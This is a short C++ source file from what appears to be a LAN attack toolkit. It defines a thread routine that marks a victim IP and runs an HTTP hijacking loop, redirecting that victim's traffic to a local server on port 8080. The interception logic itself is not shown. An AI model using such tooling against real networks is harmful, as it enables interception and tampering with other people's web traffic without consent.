//
// Created by kenny on 2/1/19.
//
#include "pth-args.h"
#include "pth-hijack-http.h"

using namespace kni;


/**
 * httpd listens on the same interface
 *
 * @param ptr
 * @return
 */
void *routine_start_hijack_http(void *ptr) {
    auto args = (pthargs_hijack_http *) ptr;

    endpoint_t httpd = {args->lan->dev.ip, 8080};

    std::unique_ptr<hijack_http_base> pHijackHttp(new hijack_http_base(args->lan, httpd));
    pHijackHttp->add_victim(args->victim_ip);

    args->io_packet = pHijackHttp.get();

    if (!pHijackHttp->open(args->devname) || !pHijackHttp->loop_packets())
        KNI_LOG_ERROR("%s", pHijackHttp->err());

    pHijackHttp->close();

    return nullptr;
}